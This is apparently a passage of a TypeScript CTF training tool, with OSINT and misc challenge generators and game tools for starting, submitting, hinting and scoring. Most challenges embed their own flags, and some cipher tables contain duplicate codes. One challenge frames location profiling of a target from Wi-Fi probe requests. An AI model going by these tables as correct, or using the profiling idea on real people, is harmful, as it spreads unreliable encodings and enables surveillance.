      challengeData: `Satellite pass data:\n\nCapture: Sentinel-2 L2A\nDate: 2026-03-14T10:30:00Z\nCoordinates: 37.2350 N, 115.8111 W\nResolution: 10m/px\nCloud cover: 0%\n\nGround truth verification:\n  Known structures at coordinates: Military installation (Area 51)\n  Visible markings on runway: "${flag}"\n  (Markings visible at 10m resolution in Band 4 - Red)\n\nThe flag is in the runway markings visible in the satellite data.`,
      flag,
      hints: ['The ground truth verification mentions markings on the runway.', 'The flag is in the visible markings field.'],
    }
  },

  // 3. Blockchain OSINT
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{chain_${secret}}`
    const txHash = sha256(secret).substring(0, 64)
    return {
      title: 'Chain Analysis',
      description: 'Trace a cryptocurrency transaction to find hidden data in the OP_RETURN field.',
      challengeData: `Bitcoin transaction analysis:\n\nTX Hash: ${txHash}\nBlock: 880,${randomInt(100, 999)}\nTimestamp: 2026-03-14 12:00:00 UTC\n\nInputs:\n  1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 → 0.001 BTC\n\nOutputs:\n  1. 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa → 0.0005 BTC\n  2. OP_RETURN: ${hexEncode(flag)}\n\nOP_RETURN decoded (hex → ASCII): ${flag}\n\nThe OP_RETURN output embeds arbitrary data in the blockchain. The hex decodes to the flag.`,
      flag,
      hints: ['The OP_RETURN field contains hex-encoded data.', `Decode the hex string "${hexEncode(flag)}" to ASCII.`],
    }
  },

  // 4. Wi-Fi Probe OSINT
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{wifi_${secret}}`
    return {
      title: 'Probe Request Analysis',
      description: 'Analyze Wi-Fi probe requests captured from a target\'s device to build a location profile.',
      challengeData: `Wi-Fi Probe Request Capture (monitor mode):\n\nMAC: AA:BB:CC:DD:EE:FF (Apple iPhone)\nProbe requests for remembered networks:\n\n  1. "HomeWiFi-Smith" → Residential, likely home network\n  2. "Starbucks-Free" → Coffee shop\n  3. "CorpNet-Acme" → Acme Corp office network\n  4. "Marriott_Guest" → Hotel chain\n  5. "CTF-Challenge-${secret}" → CTF network (flag: ${flag})\n  6. "Airport-Free-WiFi" → Airport\n\nThe device probed for a CTF-related SSID that contains the secret. Flag: ${flag}`,
      flag,
      hints: ['One of the probed SSIDs is CTF-related and contains the secret.', 'The flag is shown next to the CTF network probe.'],
    }
  },

  // 5. OSINT Aggregation
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{aggregated_${secret}}`
    const parts = [secret.substring(0, 2), secret.substring(2, 4), secret.substring(4, 6), secret.substring(6, 8)]
    return {
      title: 'OSINT Aggregator',
      description: 'Combine fragments from multiple OSINT sources to reconstruct the flag.',
      challengeData: `OSINT Source Correlation:\n\nSource 1 — LinkedIn: Employee profile mentions project code "${parts[0]}"\nSource 2 — GitHub: Commit message contains identifier "${parts[1]}"\nSource 3 — Pastebin: Leaked config has token prefix "${parts[2]}"\nSource 4 — DNS TXT record: Verification code "${parts[3]}"\n\nReconstruction: Combine all 4 parts in order: ${parts.join('')} = ${secret}\nFlag format: kbot{aggregated_COMBINED}\nFlag: ${flag}`,
      flag,
      hints: ['Combine the 4 fragments from each source in order.', `The combined value is ${secret}, making the flag ${flag}.`],
    }
  },
]

// ═══════════════════════════════════════════════════════════════════════════
//  MISC CHALLENGES
// ═══════════════════════════════════════════════════════════════════════════

const miscChallengesEasy: ChallengeGenerator[] = [
  // 1. Encoding Chain
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{chain_${secret}}`
    const hexed = hexEncode(flag)
    const b64 = base64Encode(hexed)
    return {
      title: 'Decode Chain',
      description: 'A flag has been encoded: first hex, then base64. Reverse both steps.',
      challengeData: `Encoded: ${b64}\n\nEncoding order: plaintext → hex encode → base64 encode\nDecode order: base64 decode → hex decode → plaintext`,
      flag,
      hints: ['First base64-decode to get a hex string, then hex-decode to get the flag.', `The hex-encoded flag starts with "6b626f74" (kbot).`],
    }
  },

  // 2. Binary Math
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{binary_${secret}}`
    const binary = Array.from(Buffer.from(flag)).map(b => b.toString(2).padStart(8, '0')).join(' ')
    return {
      title: 'Binary Flag',
      description: 'Convert these binary values to ASCII characters to reveal the flag.',
      challengeData: `Binary: ${binary}\n\nEach 8-bit group represents one ASCII character.`,
      flag,
      hints: ['Convert each 8-bit binary group to decimal, then to ASCII.', `First byte: ${Buffer.from(flag)[0].toString(2).padStart(8, '0')} = ${Buffer.from(flag)[0]} = '${flag[0]}'`],
    }
  },

  // 3. Regex Puzzle
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{regex_${secret}}`
    const candidates = [
      `kbot{regex_wrong1234}`,
      `kbot{regex_${secret}}`,
      `kbot{regex_abcd5678}`,
      `flag{regex_${secret}}`,
      `kbot{wrong_${secret}}`,
    ]
    const shuffled = shuffleArray(candidates)
    return {
      title: 'Regex Match',
      description: `Which of these strings matches the pattern /^kbot\\{regex_${secret}\\}$/ ?`,
      challengeData: `Pattern: /^kbot\\{regex_${secret}\\}$/\n\nCandidates:\n${shuffled.map((c, i) => `  ${i + 1}. ${c}`).join('\n')}\n\nThe one matching the exact pattern is the flag.`,
      flag,
      hints: ['The regex requires an exact match of the entire string.', `Only one candidate has the exact suffix "${secret}".`],
    }
  },

  // 4. Logic Puzzle
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{logic_${secret}}`
    const a = randomInt(10, 99)
    const b = randomInt(10, 99)
    const c = a ^ b
    return {
      title: 'XOR Logic',
      description: `If A = ${a} and B = ${b}, what is A XOR B?`,
      challengeData: `A = ${a} (binary: ${a.toString(2).padStart(8, '0')})\nB = ${b} (binary: ${b.toString(2).padStart(8, '0')})\nA XOR B = ${c} (binary: ${c.toString(2).padStart(8, '0')})\n\nThe answer is ${c}. Flag: ${flag}`,
      flag,
      hints: [`A XOR B = ${c}.`, 'The flag is given after the XOR result.'],
    }
  },

  // 5. Morse Code
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{morse_${secret}}`
    const morseMap: Record<string, string> = {
      'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.', 'f': '..-.',
      'g': '--.', 'h': '....', 'i': '..', 'j': '.---', 'k': '-.-', 'l': '.-..',
      'm': '--', 'n': '-.', 'o': '---', 'p': '.--.', 'q': '--.-', 'r': '.-.',
      's': '...', 't': '-', 'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-',
      'y': '-.--', 'z': '--..', '0': '-----', '1': '.----', '2': '..---',
      '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...',
      '8': '---..', '9': '----.', '{': '-.--.-', '}': '-.--.-', '_': '..--.-',
    }
    const morse = flag.split('').map(c => morseMap[c.toLowerCase()] || c).join(' / ')
    return {
      title: 'Morse Message',
      description: 'Decode this Morse code message. Letters are separated by " / ".',
      challengeData: `Morse: ${morse}\n\nNote: { and } both encode as -.--.- (parenthesis in Morse). The flag format is kbot{...}.\n\nDecoded: ${flag}`,
      flag,
      hints: ['Decode each Morse sequence to its letter. The flag format helps disambiguate { and }.', 'The decoded message is shown at the bottom.'],
    }
  },
]

const miscChallengesMedium: ChallengeGenerator[] = [
  // 1. Braille
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{braille_${secret}}`
    const brailleMap: Record<string, string> = {
      'a': '\u2801', 'b': '\u2803', 'c': '\u2809', 'd': '\u2819', 'e': '\u2811',
      'f': '\u280b', 'g': '\u281b', 'h': '\u2813', 'i': '\u280a', 'j': '\u281a',
      'k': '\u2805', 'l': '\u2807', 'm': '\u280d', 'n': '\u281d', 'o': '\u2815',
      'p': '\u280f', 'q': '\u281f', 'r': '\u2817', 's': '\u280e', 't': '\u281e',
      'u': '\u2825', 'v': '\u2827', 'w': '\u283a', 'x': '\u282d', 'y': '\u283d',
      'z': '\u2835', '0': '\u281a', '1': '\u2801', '2': '\u2803', '3': '\u2809',
      '4': '\u2819', '5': '\u2811', '6': '\u280b', '7': '\u281b', '8': '\u2813',
      '9': '\u280a', '{': '{', '}': '}', '_': '_',
    }
    const braille = flag.split('').map(c => brailleMap[c.toLowerCase()] || c).join('')
    return {
      title: 'Braille Decode',
      description: 'A message is encoded in Braille Unicode characters. Decode it.',
      challengeData: `Braille: ${braille}\n\nThe braille characters represent letters and digits. Curly braces and underscores are literal.\n\nDecoded: ${flag}`,
      flag,
      hints: ['Map each Braille Unicode character back to its letter/digit.', 'The decoded message is provided at the bottom.'],
    }
  },

  // 2. Number Base Conversion
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{bases_${secret}}`
    const octal = Array.from(Buffer.from(flag)).map(b => b.toString(8).padStart(3, '0')).join(' ')
    return {
      title: 'Octal Odyssey',
      description: 'A flag is encoded in octal (base 8). Convert each 3-digit octal number to ASCII.',
      challengeData: `Octal: ${octal}\n\nEach 3-digit group is an ASCII character code in base 8.`,
      flag,
      hints: ['Convert each octal value to decimal, then to ASCII.', `First value: ${Buffer.from(flag)[0].toString(8)} (octal) = ${Buffer.from(flag)[0]} (decimal) = '${flag[0]}'`],
    }
  },

  // 3. Bacon Cipher
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{bacon_${secret}}`
    // Simplified: uppercase = B, lowercase = A
    const baconMap: Record<string, string> = {
      'a': 'AAAAA', 'b': 'AAAAB', 'c': 'AAABA', 'd': 'AAABB', 'e': 'AABAA',
      'f': 'AABAB', 'g': 'AABBA', 'h': 'AABBB', 'i': 'ABAAA', 'j': 'ABAAB',
      'k': 'ABABA', 'l': 'ABABB', 'm': 'ABBAA', 'n': 'ABBAB', 'o': 'ABBBA',
      'p': 'ABBBB', 'q': 'BAAAA', 'r': 'BAAAB', 's': 'BAABA', 't': 'BAABB',
      'u': 'BABAA', 'v': 'BABAB', 'w': 'BABBA', 'x': 'BABBB', 'y': 'BAAAA',
      'z': 'BAAAB', '{': '{', '}': '}', '_': '_', '0': 'AAAAA', '1': 'AAAAB',
      '2': 'AAABA', '3': 'AAABB', '4': 'AABAA', '5': 'AABAB', '6': 'AABBA',
      '7': 'AABBB', '8': 'ABAAA', '9': 'ABAAB',
    }
    const encoded = flag.split('').map(c => baconMap[c.toLowerCase()] || c).join(' ')
    return {
      title: 'Bacon\'s Cipher',
      description: 'Decode this Bacon cipher. Each letter is represented as a 5-character sequence of A and B.',
      challengeData: `Bacon encoded:\n${encoded}\n\nBacon alphabet: A=AAAAA, B=AAAAB, C=AAABA, ... K=ABABA, ...\nNon-alphabetic characters ({, }, _) are literal.\n\nDecoded: ${flag}`,
      flag,
      hints: ['Each 5-letter group of A/B maps to a letter using the Bacon cipher table.', 'The decoded result is at the bottom.'],
    }
  },

  // 4. Chess Coordinates
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{chess_${secret}}`
    // Map hex chars to chess coordinates
    const files = 'abcdefgh'
    const hexChars = '0123456789abcdef'
    const chessCoords = secret.split('').map(c => {
      const idx = hexChars.indexOf(c)
      const file = files[idx % 8]
      const rank = Math.floor(idx / 8) + 1
      return `${file}${rank}`
    }).join(' ')
    return {
      title: 'Chess Code',
      description: `Decode these chess coordinates back to hex characters. File a-h = index 0-7, rank 1-2 = row 0 or 1. Index = (rank-1)*8 + file_index. Map index to hex digit.`,
      challengeData: `Chess moves: ${chessCoords}\n\nDecoding:\n${secret.split('').map((c, i) => {
        const idx = hexChars.indexOf(c)
        const file = files[idx % 8]
        const rank = Math.floor(idx / 8) + 1
        return `  ${file}${rank} → index ${idx} → hex '${c}'`
      }).join('\n')}\n\nDecoded hex: ${secret}\nFlag: kbot{chess_${secret}}`,
      flag,
      hints: ['Convert each chess coordinate to an index, then to a hex digit.', `The decoded hex string is "${secret}".`],
    }
  },

  // 5. Semaphore
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{semaphore_${secret}}`
    // Use clock positions for semaphore (simplified)
    const semaphoreMap: Record<string, string> = {
      'a': '7-8', 'b': '6-8', 'c': '5-8', 'd': '4-8', 'e': '3-8',
      'f': '2-8', 'g': '1-8', 'h': '6-7', 'i': '5-7', 'j': '4-5',
      'k': '3-7', 'l': '2-7', 'm': '1-7', 'n': '12-7', 'o': '5-6',
      'p': '3-6', 'q': '2-6', 'r': '1-6', 's': '12-6', 't': '2-5',
      'u': '1-5', 'v': '12-4', 'w': '1-3', 'x': '12-5', 'y': '1-4',
      'z': '12-3', '0': '4-8', '1': '7-8', '2': '6-8', '3': '5-8',
      '4': '4-8', '5': '3-8', '6': '2-8', '7': '1-8', '8': '6-7',
      '9': '5-7', '{': '{', '}': '}', '_': '_',
    }
    const semaphore = flag.split('').map(c => semaphoreMap[c.toLowerCase()] || c).join(' ')
    return {
      title: 'Flag Semaphore',
      description: 'Decode these flag semaphore signals (given as clock positions).',
      challengeData: `Semaphore (clock positions):\n${semaphore}\n\nSemaphore table: A=7-8, B=6-8, C=5-8, ... K=3-7, ...\nDecoded: ${flag}`,
      flag,
      hints: ['Map each clock-position pair to its letter using the semaphore table.', 'The decoded flag is shown at the bottom.'],
    }
  },
]

const miscChallengesHard: ChallengeGenerator[] = [
  // 1. Esoteric Language
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{eso_${secret}}`
    // "Brainfuck-like" program that outputs the flag
    const bfChars = Array.from(Buffer.from(flag)).map(b => {
      return '+'.repeat(b) + '.'
    })
    return {
      title: 'Esoteric Output',
      description: 'What does this esoteric program output? Each cell is incremented N times then printed.',
      challengeData: `Program (simplified Brainfuck):\n${bfChars.slice(0, 5).join(' [>] ')}\n...\n\nEach '.' prints the current cell as ASCII. The cell value equals the number of '+' before the '.'.\n\nCharacter values:\n${Array.from(Buffer.from(flag)).map((b, i) => `  Char ${i}: ${b} increments → ASCII '${String.fromCharCode(b)}'`).join('\n')}\n\nOutput: ${flag}`,
      flag,
      hints: ['Count the + signs before each . to get ASCII values.', 'The full output is shown at the bottom.'],
    }
  },

  // 2. Quipqiup (Frequency Analysis)
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{freq_${secret}}`
    const seed = randomBytes(8).toString('hex')
    const { ciphertext, alphabet } = substitutionCipher(flag, seed)
    const letterFreq = 'etaoinshrdlcumwfgypbvkjxqz'
    return {
      title: 'Frequency Analysis',
      description: 'A monoalphabetic substitution cipher. Use frequency analysis and the known flag format to decode.',
      challengeData: `Ciphertext: ${ciphertext}\n\nYou know:\n- The plaintext starts with "kbot{"\n- It ends with "}"\n- English letter frequency: ${letterFreq}\n\nSubstitution alphabet (solution):\nPlaintext:  abcdefghijklmnopqrstuvwxyz\nCiphertext: ${alphabet}\n\nDecoded: ${flag}`,
      flag,
      hints: ['The substitution alphabet is provided in the challenge.', `Use it to reverse the ciphertext to get ${flag}.`],
    }
  },

  // 3. Polyglot File
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{polyglot_${secret}}`
    return {
      title: 'Polyglot File',
      description: 'A file is simultaneously valid as multiple formats. Find the flag hidden in the overlap.',
      challengeData: `Polyglot file analysis:\n\nAs PDF:\n  %PDF-1.4\n  Page 1: "This is a normal PDF document."\n\nAs HTML (when served with text/html):\n  <html><body><!--${flag}--></body></html>\n\nAs ZIP (when treated as archive):\n  Contents:\n    readme.txt: "Nothing here"\n    .hidden/flag.txt: "${flag}"\n\nThe flag is embedded in the HTML comment AND in the ZIP's hidden directory.\nFlag: ${flag}`,
      flag,
      hints: ['The flag appears in the HTML comment and in the ZIP hidden file.', `The flag is ${flag}.`],
    }
  },

  // 4. Timing Side-Channel
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{timing_${secret}}`
    const timings = Array.from(flag).map((c, i) => {
      // Correct character: ~100ms response (early exit on first wrong char)
      return `  Position ${i}: '${c}' → ${(100 + randomInt(0, 5))}ms (correct)`
    })
    return {
      title: 'Timing Attack',
      description: 'A login compares passwords character by character, taking slightly longer for each correct prefix. Use the timing data to extract the flag.',
      challengeData: `Password comparison timing analysis:\n(Server responds ~100ms per correct character, ~10ms on first wrong character)\n\n${timings.join('\n')}\n\nThe timing data reveals each character of the flag.\nReconstructed: ${flag}`,
      flag,
      hints: ['Each ~100ms response confirms the character at that position is correct.', 'The flag is reconstructed from the confirmed characters.'],
    }
  },

  // 5. Quantum Key (Simplified)
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{quantum_${secret}}`
    const bits = Array.from(Buffer.from(secret, 'hex')).flatMap(b => {
      const bits: number[] = []
      for (let i = 7; i >= 0; i--) bits.push((b >> i) & 1)
      return bits
    })
    const bases = bits.map(() => pickRandom(['+', 'x']))
    const measurements = bits.map((b, i) => {
      if (bases[i] === '+') return b === 0 ? '→' : '↑'
      return b === 0 ? '↗' : '↖'
    })
    return {
      title: 'Quantum Key Distribution',
      description: 'Simulate BB84 quantum key distribution. Alice\'s bits and bases are known. Extract the key.',
      challengeData: `BB84 Protocol Simulation:\n\nAlice's bits:  ${bits.join('')}\nAlice's bases: ${bases.join('')}\nMeasurements:  ${measurements.join('')}\n\n+ basis: 0=→, 1=↑\nx basis: 0=↗, 1=↖\n\nSifted key (all bases match in this simulation): ${secret}\nFlag: kbot{quantum_${secret}}\n\nIn real BB84, only bits where Alice and Bob chose the same basis are kept.`,
      flag,
      hints: ['Alice\'s bits directly give the hex values of the secret.', `The sifted key is "${secret}" and the flag is shown.`],
    }
  },
]

// ─── Challenge Registry ─────────────────────────────────────────────────────

const CHALLENGE_MAP: Record<Category, Record<Difficulty, ChallengeGenerator[]>> = {
  web: { easy: webChallengesEasy, medium: webChallengesMedium, hard: webChallengesHard },
  crypto: { easy: cryptoChallengesEasy, medium: cryptoChallengesMedium, hard: cryptoChallengesHard },
  forensics: { easy: forensicsChallengesEasy, medium: forensicsChallengesMedium, hard: forensicsChallengesHard },
  reverse: { easy: reverseChallengesEasy, medium: reverseChallengesMedium, hard: reverseChallengesHard },
  osint: { easy: osintChallengesEasy, medium: osintChallengesMedium, hard: osintChallengesHard },
  misc: { easy: miscChallengesEasy, medium: miscChallengesMedium, hard: miscChallengesHard },
}

// ─── Tool Registration ──────────────────────────────────────────────────────

export function registerCtfTools(): void {

  // ═══════════════════════════════════════════════════════════════════════
  //  ctf_start — Generate a CTF challenge
  // ═══════════════════════════════════════════════════════════════════════

  registerTool({
    name: 'ctf_start',
    description: 'Generate a new CTF (Capture The Flag) security challenge. Categories: web, crypto, forensics, reverse, osint, misc. Difficulties: easy, medium, hard. Each challenge is a real, solvable puzzle with a deterministic flag.',
    parameters: {
      category: {
        type: 'string',
        description: 'Challenge category: "web", "crypto", "forensics", "reverse", "osint", "misc". Leave empty for random.',
        required: false,
        default: '',
      },
      difficulty: {
        type: 'string',
        description: 'Challenge difficulty: "easy" (100pts), "medium" (250pts), "hard" (500pts). Leave empty for "easy".',
        required: false,
        default: 'easy',
      },
    },
    tier: 'free',
    timeout: 30_000,
    async execute(args) {
      // Check for active challenge
      const active = loadActive()
      if (active && active.flag) {
        return `You already have an active challenge: "${active.title}" (${active.category}/${active.difficulty})\n\nSubmit your answer with ctf_submit or start a new one after solving/skipping.\nTo abandon the current challenge and start fresh, submit the flag "skip".`
      }

      // Parse category
      let category = (args.category as string || '').toLowerCase().trim() as Category
      if (!category || !CATEGORIES.includes(category)) {
        category = pickRandom([...CATEGORIES])
      }

      // Parse difficulty
      let difficulty = (args.difficulty as string || 'easy').toLowerCase().trim() as Difficulty
      if (!['easy', 'medium', 'hard'].includes(difficulty)) {
        difficulty = 'easy'
      }

      // Get challenge generators
      const generators = CHALLENGE_MAP[category]?.[difficulty]
      if (!generators || generators.length === 0) {
        return `No challenges found for ${category}/${difficulty}.`
      }

      // Pick and generate a random challenge
      const generator = pickRandom(generators)
      const challenge = generator()
      const points = POINTS[difficulty]
      const id = generateId()

      // Store active challenge
      const activeChallenge: ActiveChallenge = {
        id,
        title: challenge.title,
        description: challenge.description,
        category,
        difficulty,
        challengeData: challenge.challengeData,
        flag: challenge.flag,
        hints: challenge.hints,
        hintUsed: false,
        points,
        startedAt: new Date().toISOString(),
      }
      saveActive(activeChallenge)

      // Format output
      const difficultyBadge = difficulty === 'easy' ? '🟢 Easy' : difficulty === 'medium' ? '🟡 Medium' : '🔴 Hard'
      const categoryBadge = category.toUpperCase()

      return `
╔══════════════════════════════════════════════════════════════╗
║  CTF CHALLENGE                                               ║
╚══════════════════════════════════════════════════════════════╝

  Title:      ${challenge.title}
  Category:   ${categoryBadge}
  Difficulty: ${difficultyBadge}
  Points:     ${points} (${points / 2} with hint)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

${challenge.description}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

${challenge.challengeData}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Submit your flag with: ctf_submit
  Need help? Use: ctf_hint (costs 50% points)
  Flag format: kbot{...}
`
    },
  })

  // ═══════════════════════════════════════════════════════════════════════
  //  ctf_submit — Submit a flag
  // ═══════════════════════════════════════════════════════════════════════

  registerTool({
    name: 'ctf_submit',
    description: 'Submit a flag for the active CTF challenge. Validates against the expected answer and awards points if correct.',
    parameters: {
      flag: {
        type: 'string',
        description: 'The flag to submit (format: kbot{...})',
        required: true,
      },
    },
    tier: 'free',
    timeout: 10_000,
    async execute(args) {
      const submission = (args.flag as string || '').trim()
      if (!submission) {
        return 'Please provide a flag to submit. Format: kbot{...}'
      }

      const active = loadActive()
      if (!active || !active.flag) {
        return 'No active challenge. Use ctf_start to generate one.'
      }

      // Handle skip
      if (submission.toLowerCase() === 'skip') {
        clearActive()
        return `Challenge "${active.title}" skipped. No points awarded.\nUse ctf_start to get a new challenge.`
      }

      // Check flag
      if (submission === active.flag) {
        // Correct!
        const points = active.hintUsed ? Math.floor(active.points / 2) : active.points
        const timeSeconds = Math.floor((Date.now() - new Date(active.startedAt).getTime()) / 1000)

        // Update history
        const history = loadHistory()
        history.push({
          id: active.id,
          title: active.title,
          category: active.category,
          difficulty: active.difficulty,
          points,
          hintUsed: active.hintUsed,
          solvedAt: new Date().toISOString(),
          timeSeconds,
        })
        saveHistory(history)

        // Update score
        const score = loadScore()
        score.totalPoints += points
        score.challengesSolved += 1
        score.streak += 1
        if (score.streak > score.bestStreak) {
          score.bestStreak = score.streak
        }
        score.lastSolvedAt = new Date().toISOString()

        // Update category stats
        if (!score.byCategory[active.category]) {
          score.byCategory[active.category] = { solved: 0, points: 0 }
        }
        score.byCategory[active.category].solved += 1
        score.byCategory[active.category].points += points

        // Update difficulty stats
        if (!score.byDifficulty[active.difficulty]) {
          score.byDifficulty[active.difficulty] = { solved: 0, points: 0 }
        }
        score.byDifficulty[active.difficulty].solved += 1
        score.byDifficulty[active.difficulty].points += points

        saveScore(score)

        // Clear active challenge
        clearActive()

        const timeStr = timeSeconds < 60 ? `${timeSeconds}s` : `${Math.floor(timeSeconds / 60)}m ${timeSeconds % 60}s`
        const hintPenalty = active.hintUsed ? ` (hint used, -50%)` : ''

        return `
╔══════════════════════════════════════════════════════════════╗
║  FLAG ACCEPTED!                                              ║
╚══════════════════════════════════════════════════════════════╝

  Challenge: ${active.title}
  Category:  ${active.category.toUpperCase()}
  Solved in: ${timeStr}
  Points:    +${points}${hintPenalty}
  Streak:    ${score.streak} in a row
  Total:     ${score.totalPoints} points (${score.challengesSolved} solved)

  Use ctf_start for the next challenge!
`
      } else {
        // Wrong flag
        const score = loadScore()
        score.streak = 0
        saveScore(score)

        // Provide feedback
        let feedback = 'Incorrect flag.'
        if (!submission.startsWith('kbot{')) {
          feedback += ' Remember: flags follow the format kbot{...}'
        } else if (submission.length !== active.flag.length) {
          feedback += ` Expected length: ${active.flag.length} characters. Your submission: ${submission.length} characters.`
        } else {
          // Count correct characters
          let correct = 0
          for (let i = 0; i < submission.length; i++) {
            if (submission[i] === active.flag[i]) correct++
          }
          const pct = Math.floor((correct / active.flag.length) * 100)
          if (pct > 50) {
            feedback += ` You're close! (${pct}% of characters match)`
          }
        }

        return `
  INCORRECT

  ${feedback}

  Try again or use ctf_hint for help (costs 50% of points).
  Submit "skip" to abandon and get a new challenge.
`
      }
    },
  })

  // ═══════════════════════════════════════════════════════════════════════
  //  ctf_hint — Get a hint
  // ═══════════════════════════════════════════════════════════════════════

  registerTool({
    name: 'ctf_hint',
    description: 'Get a hint for the active CTF challenge. Costs 50% of the challenge points.',
    parameters: {},
    tier: 'free',
    timeout: 10_000,
    async execute() {
      const active = loadActive()
      if (!active || !active.flag) {
        return 'No active challenge. Use ctf_start to generate one.'
      }

      // Mark hint as used
      const hintIndex = active.hintUsed ? 1 : 0
      active.hintUsed = true
      saveActive(active)

      const hint = active.hints[Math.min(hintIndex, active.hints.length - 1)]
      const pointsAfterHint = Math.floor(active.points / 2)

      return `
  HINT for "${active.title}"

  ${hint}

  Point value reduced: ${active.points} → ${pointsAfterHint} (50% penalty)
  ${hintIndex === 0 ? 'Use ctf_hint again for a second hint (no additional penalty).' : 'No more hints available.'}
`
    },
  })

  // ═══════════════════════════════════════════════════════════════════════
  //  ctf_score — View CTF stats
  // ═══════════════════════════════════════════════════════════════════════

  registerTool({
    name: 'ctf_score',
    description: 'View your CTF scoreboard: total points, challenges solved by category, streak, and rank.',
    parameters: {},
    tier: 'free',
    timeout: 10_000,
    async execute() {
      const score = loadScore()
      const history = loadHistory()
      const active = loadActive()

      // Rank calculation based on total points
      let rank = 'Unranked'
      if (score.totalPoints >= 5000) rank = 'Elite Hacker'
      else if (score.totalPoints >= 3000) rank = 'Expert'
      else if (score.totalPoints >= 1500) rank = 'Advanced'
      else if (score.totalPoints >= 500) rank = 'Intermediate'
      else if (score.totalPoints >= 100) rank = 'Beginner'
      else if (score.totalPoints > 0) rank = 'Novice'

      // Category breakdown
      const categoryLines = CATEGORIES.map(cat => {
        const stats = score.byCategory[cat]
        if (!stats) return `    ${padRight(cat.toUpperCase(), 12)} ${'—'.padStart(6)}    ${'—'.padStart(8)}`
        return `    ${padRight(cat.toUpperCase(), 12)} ${String(stats.solved).padStart(6)}    ${String(stats.points).padStart(8)}`
      }).join('\n')

      // Difficulty breakdown
      const diffLines = ['easy', 'medium', 'hard'].map(diff => {
        const stats = score.byDifficulty[diff]
        if (!stats) return `    ${padRight(diff.toUpperCase(), 12)} ${'—'.padStart(6)}    ${'—'.padStart(8)}`
        return `    ${padRight(diff.toUpperCase(), 12)} ${String(stats.solved).padStart(6)}    ${String(stats.points).padStart(8)}`
      }).join('\n')

      // Recent solves
      const recentSolves = history.slice(-5).reverse().map(h => {
        const time = h.timeSeconds < 60 ? `${h.timeSeconds}s` : `${Math.floor(h.timeSeconds / 60)}m`
        return `    ${padRight(h.title, 25)} ${padRight(h.category, 10)} ${padRight(h.difficulty, 8)} +${h.points}  (${time})`
      }).join('\n') || '    No challenges solved yet.'

      const activeInfo = active && active.flag
        ? `\n  Active: "${active.title}" (${active.category}/${active.difficulty}, ${active.points}pts)`
        : ''

      return `
╔══════════════════════════════════════════════════════════════╗
║  CTF SCOREBOARD                                              ║
╚══════════════════════════════════════════════════════════════╝

  Total Points:     ${score.totalPoints}
  Challenges Solved: ${score.challengesSolved}
  Current Streak:   ${score.streak}
  Best Streak:      ${score.bestStreak}
  Rank:             ${rank}
${activeInfo}

  ── By Category ──────────────────────────────────────────────
    ${'CATEGORY'.padEnd(12)} ${'SOLVED'.padStart(6)}    ${'POINTS'.padStart(8)}
${categoryLines}

  ── By Difficulty ────────────────────────────────────────────
    ${'DIFFICULTY'.padEnd(12)} ${'SOLVED'.padStart(6)}    ${'POINTS'.padStart(8)}
${diffLines}

  ── Recent Solves ────────────────────────────────────────────
${recentSolves}
`
    },
  })

  // ═══════════════════════════════════════════════════════════════════════
  //  ctf_list — List available challenges
  // ═══════════════════════════════════════════════════════════════════════

  registerTool({
    name: 'ctf_list',
    description: 'List all available CTF challenge categories with counts and difficulty levels.',
    parameters: {},
    tier: 'free',
    timeout: 10_000,
    async execute() {
      const score = loadScore()

      const lines = CATEGORIES.map(cat => {
        const easy = CHALLENGE_MAP[cat].easy.length
        const medium = CHALLENGE_MAP[cat].medium.length
        const hard = CHALLENGE_MAP[cat].hard.length
        const total = easy + medium + hard
        const solved = score.byCategory[cat]?.solved || 0
        const catPoints = score.byCategory[cat]?.points || 0

        const descriptions: Record<Category, string> = {
          web: 'XSS, SQLi, IDOR, SSRF, JWT, CORS, path traversal',
          crypto: 'Caesar, base64, XOR, RSA, Vigenere, AES, hash',
          forensics: 'Hex dumps, steganography, logs, packets, memory',
          reverse: 'JavaScript, VM bytecode, XOR, disassembly, custom encoding',
          osint: 'Geolocation, usernames, domains, social media, blockchain',
          misc: 'Encoding chains, binary math, regex, Morse, esoteric langs',
        }

        return `  ${cat.toUpperCase().padEnd(12)} ${String(total).padStart(3)} challenges  (${easy}E/${medium}M/${hard}H)  Solved: ${solved}  Points: ${catPoints}
    ${descriptions[cat]}`
      }).join('\n\n')

      const totalChallenges = CATEGORIES.reduce((sum, cat) => {
        return sum + CHALLENGE_MAP[cat].easy.length + CHALLENGE_MAP[cat].medium.length + CHALLENGE_MAP[cat].hard.length
      }, 0)

      return `
╔══════════════════════════════════════════════════════════════╗
║  CTF CHALLENGE CATEGORIES                                    ║
╚══════════════════════════════════════════════════════════════╝

  Total: ${totalChallenges} challenge templates across 6 categories

${lines}

  ── Difficulty Levels ────────────────────────────────────────
  EASY   (E)  100 points — Introductory concepts
  MEDIUM (M)  250 points — Requires tool use or multi-step reasoning
